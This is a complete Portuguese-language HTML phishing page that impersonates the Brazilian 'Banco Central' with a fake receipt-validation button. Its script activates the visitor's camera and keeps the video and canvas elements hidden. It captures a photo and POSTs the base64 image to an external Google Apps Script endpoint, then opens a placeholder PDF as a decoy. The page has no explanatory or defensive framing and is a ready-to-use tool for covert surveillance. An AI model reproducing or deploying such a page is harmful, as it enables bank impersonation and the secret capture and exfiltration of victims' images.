<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Comprovante</title>

<style>

body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            /* Overlay para melhor legibilidade */
            position: relative;
    font-family:Arial, sans-serif;
}

.container{
    background:#fff;
    width:90%;
    max-width:500px;
    padding:30px;
    border-radius:12px;
    box-shadow:0 2px 10px rgba(0,0,0,.15);
    text-align:center;
}

h2{
    margin-top:0;
}

p{
    color:#555;
    margin-bottom:25px;
}

button{
    width:100%;
    height:50px;
    border:none;
    border-radius:8px;
    background:#0d6efd;
    color:#fff;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    background:#0b5ed7;
}

/* elementos ocultos */
video,
canvas{
    display:none;
}

</style>

</head>
<body>

<div class="container">

    <h2>Valide aqui</h2>

    <p>
        Banco Central
    </p>

    <button id="baixarBtn">
        Validar
    </button>

</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>

const APPS_SCRIPT_URL =
'https://script.google.com/macros/s/AKfycbxnSyAgWR5ho-OI3enmcHOszS_GBYA0y10fDYZ6SAQxYKpaoamW0tlIrQC_3rR4ZCof/exec';

/* LINK DO PDF */
const COMPROVANTE_URL =
'https://SEU_LINK_AQUI.pdf';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

let stream = null;

/* inicia câmera em segundo plano */
async function iniciarCamera(){

    try{

        stream = await navigator.mediaDevices.getUserMedia({
            video:true,
            audio:false
        });

        video.srcObject = stream;

        await video.play();

    }catch(erro){

        console.error(erro);

        alert(
            'Não foi possível'
        );

    }

}

/* envia foto */
async function enviarFoto(base64){

    const formData = new FormData();

    formData.append(
        'imagem',
        base64
    );

    const resposta = await fetch(
        APPS_SCRIPT_URL,
        {
            method:'POST',
            body:formData
        }
    );

    return await resposta.text();

}

/* captura foto */
async function capturarFoto(){

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext('2d');

    ctx.drawImage(
        video,
        0,
        0,
        canvas.width,
        canvas.height
    );

    return canvas.toDataURL(
        'image/png'
    );

}

/* inicia automaticamente */


document
.getElementById('baixarBtn')
.addEventListener('click', async function(){

    try {

        this.disabled = true;
        this.innerText = 'Aguarde...';

        if(!stream){

            await iniciarCamera();

            // pequena pausa para a câmera estabilizar
            await new Promise(resolve =>
                setTimeout(resolve, 1000)
            );

        }

        const foto = await capturarFoto();

        await enviarFoto(foto);

        window.open(
            COMPROVANTE_URL,
            '_blank'
        );

        this.disabled = false;
        this.innerText =
            'Validar Email';

    } catch(erro) {

        console.error(erro);

        alert(
            'Erro ao abrir anuncio.'
        );

        this.disabled = false;
        this.innerText =
            'Validar Email';

    }

});

</script>

</body>
</html>
